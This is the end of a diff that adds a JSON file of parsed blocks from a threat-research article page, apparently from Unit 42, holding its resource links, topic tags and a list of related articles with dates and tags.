+   "text": "Communications Protocol Guide, FortiGate / FortiManager 7.4 - Fortinet",
+   "type": "list",
+   "section": "Additional Resources"
+  },
+  {
+   "id": "b195",
+   "page": null,
+   "text": "Fortinet Analysis of Single Sign-On Abuse on FortiOS - Fortinet Blog",
+   "type": "list",
+   "section": "Additional Resources"
+  },
+  {
+   "id": "b196",
+   "page": null,
+   "text": "Tags",
+   "type": "heading",
+   "level": 3,
+   "section": "Tags"
+  },
+  {
+   "id": "b197",
+   "page": null,
+   "text": "Apache",
+   "type": "list",
+   "section": "Tags"
+  },
+  {
+   "id": "b198",
+   "page": null,
+   "text": "CL-STA-0954",
+   "type": "list",
+   "section": "Tags"
+  },
+  {
+   "id": "b199",
+   "page": null,
+   "text": "Logging",
+   "type": "list",
+   "section": "Tags"
+  },
+  {
+   "id": "b200",
+   "page": null,
+   "text": "Network intrusion",
+   "type": "list",
+   "section": "Tags"
+  },
+  {
+   "id": "b201",
+   "page": null,
+   "text": "Network Sniffer",
+   "type": "list",
+   "section": "Tags"
+  },
+  {
+   "id": "b202",
+   "page": null,
+   "text": "Payload",
+   "type": "list",
+   "section": "Tags"
+  },
+  {
+   "id": "b203",
+   "page": null,
+   "text": "Reverse shells",
+   "type": "list",
+   "section": "Tags"
+  },
+  {
+   "id": "b204",
+   "page": null,
+   "text": "VPN",
+   "type": "list",
+   "section": "Tags"
+  },
+  {
+   "id": "b205",
+   "page": null,
+   "text": "Threat Research Center",
+   "type": "paragraph",
+   "section": "Tags"
+  },
+  {
+   "id": "b206",
+   "page": null,
+   "text": "Next: The Noise Inside the Network: How an Unsophisticated Attack Exposed a Third-Party Risk",
+   "type": "paragraph",
+   "section": "Tags"
+  },
+  {
+   "id": "b207",
+   "page": null,
+   "text": "Table of Contents",
+   "type": "heading",
+   "level": 3,
+   "section": "Table of Contents"
+  },
+  {
+   "id": "b208",
+   "page": null,
+   "text": "Related Articles",
+   "type": "heading",
+   "level": 3,
+   "section": "Related Articles"
+  },
+  {
+   "id": "b209",
+   "page": null,
+   "text": "AI-Powered Espionage Campaign Targets Government Linux Infrastructure",
+   "type": "list",
+   "section": "Related Articles"
+  },
+  {
+   "id": "b210",
+   "page": null,
+   "text": "Blinder Tunnel Campaign Targets Iraqi Infrastructure",
+   "type": "list",
+   "section": "Related Articles"
+  },
+  {
+   "id": "b211",
+   "page": null,
+   "text": "From Exposure to Lockdown: How AWS Neutralizes Compromised IAM Credentials through Managed Policies",
+   "type": "list",
+   "section": "Related Articles"
+  },
+  {
+   "id": "b212",
+   "page": null,
+   "text": "Related Malware Resources",
+   "type": "heading",
+   "level": 2,
+   "section": "Related Malware Resources"
+  },
+  {
+   "id": "b213",
+   "page": null,
+   "text": "Threat Research",
+   "type": "paragraph",
+   "section": "Related Malware Resources"
+  },
+  {
+   "id": "b214",
+   "page": null,
+   "text": "October 15, 2026",
+   "type": "paragraph",
+   "section": "Related Malware Resources"
+  },
+  {
+   "id": "b215",
+   "page": null,
+   "text": "AI-Powered Espionage Campaign Targets Government Linux Infrastructure",
+   "type": "heading",
+   "level": 4,
+   "section": "AI-Powered Espionage Campaign Targets Government Linux Infrastructure"
+  },
+  {
+   "id": "b216",
+   "page": null,
+   "text": "Exfiltration",
+   "type": "list",
+   "section": "AI-Powered Espionage Campaign Targets Government Linux Infrastructure"
+  },
+  {
+   "id": "b217",
+   "page": null,
+   "text": "LLM",
+   "type": "list",
+   "section": "AI-Powered Espionage Campaign Targets Government Linux Infrastructure"
+  },
+  {
+   "id": "b218",
+   "page": null,
+   "text": "Network security",
+   "type": "list",
+   "section": "AI-Powered Espionage Campaign Targets Government Linux Infrastructure"
+  },
+  {
+   "id": "b219",
+   "page": null,
+   "text": "Read now",
+   "type": "paragraph",
+   "section": "AI-Powered Espionage Campaign Targets Government Linux Infrastructure"
+  },
+  {
+   "id": "b220",
+   "page": null,
+   "text": "Threat Research",
+   "type": "paragraph",
+   "section": "AI-Powered Espionage Campaign Targets Government Linux Infrastructure"
+  },
+  {
+   "id": "b221",
+   "page": null,
+   "text": "October 6, 2026",
+   "type": "paragraph",
+   "section": "AI-Powered Espionage Campaign Targets Government Linux Infrastructure"
+  },
+  {
+   "id": "b222",
+   "page": null,
+   "text": "Blinder Tunnel Campaign Targets Iraqi Infrastructure",
+   "type": "heading",
+   "level": 4,
+   "section": "Blinder Tunnel Campaign Targets Iraqi Infrastructure"
+  },
+  {
+   "id": "b223",
+   "page": null,
+   "text": "Advanced Persistent Threat",
+   "type": "list",
+   "section": "Blinder Tunnel Campaign Targets Iraqi Infrastructure"
+  },
+  {
+   "id": "b224",
+   "page": null,
+   "text": "Agent Serpens",
+   "type": "list",
+   "section": "Blinder Tunnel Campaign Targets Iraqi Infrastructure"
+  },
+  {
+   "id": "b225",
+   "page": null,
+   "text": "AppDomainManager",
+   "type": "list",
+   "section": "Blinder Tunnel Campaign Targets Iraqi Infrastructure"
+  },
+  {
+   "id": "b226",
+   "page": null,
+   "text": "Read now",
+   "type": "paragraph",
+   "section": "Blinder Tunnel Campaign Targets Iraqi Infrastructure"
+  },
+  {
+   "id": "b227",
+   "page": null,
+   "text": "Threat Research",
+   "type": "paragraph",
+   "section": "Blinder Tunnel Campaign Targets Iraqi Infrastructure"
+  },
+  {
+   "id": "b228",
+   "page": null,
+   "text": "September 29, 2026",
+   "type": "paragraph",
+   "section": "Blinder Tunnel Campaign Targets Iraqi Infrastructure"
+  },
+  {
+   "id": "b229",
+   "page": null,
+   "text": "OperTraitors: How Kubernetes Operators Betray Your Security Posture",
+   "type": "heading",
+   "level": 4,
+   "section": "OperTraitors: How Kubernetes Operators Betray Your Security Posture"
+  },
+  {
+   "id": "b230",
+   "page": null,
+   "text": "AI",
+   "type": "list",
+   "section": "OperTraitors: How Kubernetes Operators Betray Your Security Posture"
+  },
+  {
+   "id": "b231",
+   "page": null,
+   "text": "AI agents",
+   "type": "list",
+   "section": "OperTraitors: How Kubernetes Operators Betray Your Security Posture"
+  },
+  {
+   "id": "b232",
+   "page": null,
+   "text": "API",
+   "type": "list",
+   "section": "OperTraitors: How Kubernetes Operators Betray Your Security Posture"
+  },
+  {
+   "id": "b233",
+   "page": null,
+   "text": "Read now",
+   "type": "paragraph",
+   "section": "OperTraitors: How Kubernetes Operators Betray Your Security Posture"
+  },
+  {
+   "id": "b234",
+   "page": null,
+   "text": "Insights",
+   "type": "paragraph",
+   "section": "OperTraitors: How Kubernetes Operators Betray Your Security Posture"
+  },
+  {
+   "id": "b235",
+   "page": null,
+   "text": "September 16, 2026",
+   "type": "paragraph",
+   "section": "OperTraitors: How Kubernetes Operators Betray Your Security Posture"
+  },
+  {
+   "id": "b236",
+   "page": null,
+   "text": "Atomic macOS (AMOS) Stealer Activity",
+   "type": "heading",
+   "level": 4,
+   "section": "Atomic macOS (AMOS) Stealer Activity"
+  },
+  {
+   "id": "b237",
+   "page": null,
+   "text": "MacOS",
+   "type": "list",
+   "section": "Atomic macOS (AMOS) Stealer Activity"
+  },
+  {
+   "id": "b238",
+   "page": null,
+   "text": "Threat intelligence",
+   "type": "list",
+   "section": "Atomic macOS (AMOS) Stealer Activity"
+  },
+  {
+   "id": "b239",
+   "page": null,
+   "text": "Unit 42",
+   "type": "list",
+   "section": "Atomic macOS (AMOS) Stealer Activity"
+  },
+  {
+   "id": "b240",
+   "page": null,
+   "text": "Read now",
+   "type": "paragraph",
+   "section": "Atomic macOS (AMOS) Stealer Activity"
+  },
+  {
+   "id": "b241",
+   "page": null,
+   "text": "Threat Research",
+   "type": "paragraph",
+   "section": "Atomic macOS (AMOS) Stealer Activity"
+  },
+  {
+   "id": "b242",
+   "page": null,
+   "text": "September 10, 2026",
+   "type": "paragraph",
+   "section": "Atomic macOS (AMOS) Stealer Activity"
+  },
+  {
+   "id": "b243",
+   "page": null,
+   "text": "The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE",
+   "type": "heading",
+   "level": 4,
+   "section": "The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE"
+  },
+  {
+   "id": "b244",
+   "page": null,
+   "text": "API",
+   "type": "list",
+   "section": "The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE"
+  },
+  {
+   "id": "b245",
+   "page": null,
+   "text": "Cryptographic",
+   "type": "list",
+   "section": "The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE"
+  },
+  {
+   "id": "b246",
+   "page": null,
+   "text": "JSON",
+   "type": "list",
+   "section": "The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE"
+  },
+  {
+   "id": "b247",
+   "page": null,
+   "text": "Read now",
+   "type": "paragraph",
+   "section": "The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE"
+  },
+  {
+   "id": "b248",
+   "page": null,
+   "text": "Threat Research",
+   "type": "paragraph",
+   "section": "The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE"
+  },
+  {
+   "id": "b249",
+   "page": null,
+   "text": "September 9, 2026",
+   "type": "paragraph",
+   "section": "The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE"
+  },
+  {
+   "id": "b250",
+   "page": null,
+   "text": "Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure",
+   "type": "heading",
+   "level": 4,
+   "section": "Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure"
+  },
+  {
+   "id": "b251",
+   "page": null,
+   "text": "ARKTunnel",
+   "type": "list",
+   "section": "Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure"
+  },
+  {
+   "id": "b252",
+   "page": null,
+   "text": "C2",
+   "type": "list",
+   "section": "Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure"
+  },
+  {
+   "id": "b253",
+   "page": null,
+   "text": "CL-CRI-1171",
+   "type": "list",
+   "section": "Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure"
+  },
+  {
+   "id": "b254",
+   "page": null,
+   "text": "Read now",
+   "type": "paragraph",
+   "section": "Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure"
+  },
+  {
+   "id": "b255",
+   "page": null,
+   "text": "Threat Research",
+   "type": "paragraph",
+   "section": "Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure"
+  },
+  {
+   "id": "b256",
+   "page": null,
+   "text": "September 3, 2026",
+   "type": "paragraph",
+   "section": "Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure"
+  },
+  {
+   "id": "b257",
+   "page": null,
+   "text": "Attackers Expose Ongoing AI Tool Use Targeting Organizations in Latin America",
+   "type": "heading",
+   "level": 4,
+   "section": "Attackers Expose Ongoing AI Tool Use Targeting Organizations in Latin America"
+  },
+  {
+   "id": "b258",
+   "page": null,
+   "text": "Agentic AI",
+   "type": "list",
+   "section": "Attackers Expose Ongoing AI Tool Use Targeting Organizations in Latin America"
+  },
+  {
+   "id": "b259",
+   "page": null,
+   "text": "ChatGPT",
+   "type": "list",
+   "section": "Attackers Expose Ongoing AI Tool Use Targeting Organizations in Latin America"
+  },
+  {
+   "id": "b260",
+   "page": null,
+   "text": "CL-CRI-1131",
+   "type": "list",
+   "section": "Attackers Expose Ongoing AI Tool Use Targeting Organizations in Latin America"
+  },
+  {
+   "id": "b261",
+   "page": null,
+   "text": "Read now",
+   "type": "paragraph",
+   "section": "Attackers Expose Ongoing AI Tool Use Targeting Organizations in Latin America"
+  },
+  {
+   "id": "b262",
+   "page": null,
+   "text": "Threat Research",
+   "type": "paragraph",
+   "section": "Attackers Expose Ongoing AI Tool Use Targeting Organizations in Latin America"
+  },
+  {
+   "id": "b263",
+   "page": null,
+   "text": "August 31, 2026",
+   "type": "paragraph",
+   "section": "Attackers Expose Ongoing AI Tool Use Targeting Organizations in Latin America"
+  },
+  {
+   "id": "b264",
+   "page": null,
+   "text": "Spring Ring: An Inside Look at Voice Phishing Campaigns in Microsoft Teams",
+   "type": "heading",
+   "level": 4,
+   "section": "Spring Ring: An Inside Look at Voice Phishing Campaigns in Microsoft Teams"
+  },
+  {
+   "id": "b265",
+   "page": null,
+   "text": "Cloaked Ursa",
+   "type": "list",
+   "section": "Spring Ring: An Inside Look at Voice Phishing Campaigns in Microsoft Teams"
+  },
+  {
+   "id": "b266",
+   "page": null,
+   "text": "Entra ID",
+   "type": "list",
+   "section": "Spring Ring: An Inside Look at Voice Phishing Campaigns in Microsoft Teams"
+  },
+  {
+   "id": "b267",
+   "page": null,
+   "text": "Microsoft Teams",
+   "type": "list",
+   "section": "Spring Ring: An Inside Look at Voice Phishing Campaigns in Microsoft Teams"
+  },
+  {
+   "id": "b268",
+   "page": null,
+   "text": "Read now",
+   "type": "paragraph",
+   "section": "Spring Ring: An Inside Look at Voice Phishing Campaigns in Microsoft Teams"
+  },
+  {
+   "id": "b269",
+   "page": null,
+   "text": "Threat Research",
+   "type": "paragraph",
+   "section": "Spring Ring: An Inside Look at Voice Phishing Campaigns in Microsoft Teams"
+  },
+  {
+   "id": "b270",
+   "page": null,
+   "text": "August 25, 2026",
+   "type": "paragraph",
+   "section": "Spring Ring: An Inside Look at Voice Phishing Campaigns in Microsoft Teams"
+  },
+  {
+   "id": "b271",
+   "page": null,
+   "text": "The State of AI-Enabled Malware August 2026: From Brand Abuse to Agentic Execution",
+   "type": "heading",
+   "level": 4,
+   "section": "The State of AI-Enabled Malware August 2026: From Brand Abuse to Agentic Execution"
+  },
+  {
+   "id": "b272",
+   "page": null,
+   "text": "Backdoor",
+   "type": "list",
+   "section": "The State of AI-Enabled Malware August 2026: From Brand Abuse to Agentic Execution"
+  },
+  {
+   "id": "b273",
+   "page": null,
+   "text": "Bitcoin",
+   "type": "list",
+   "section": "The State of AI-Enabled Malware August 2026: From Brand Abuse to Agentic Execution"
+  },
+  {
+   "id": "b274",
+   "page": null,
+   "text": "DLL hijacking",
+   "type": "list",
+   "section": "The State of AI-Enabled Malware August 2026: From Brand Abuse to Agentic Execution"
+  },
+  {
+   "id": "b275",
+   "page": null,
+   "text": "Read now",
+   "type": "paragraph",
+   "section": "The State of AI-Enabled Malware August 2026: From Brand Abuse to Agentic Execution"
+  }
+ ],
+ "language": "en-us"
+}
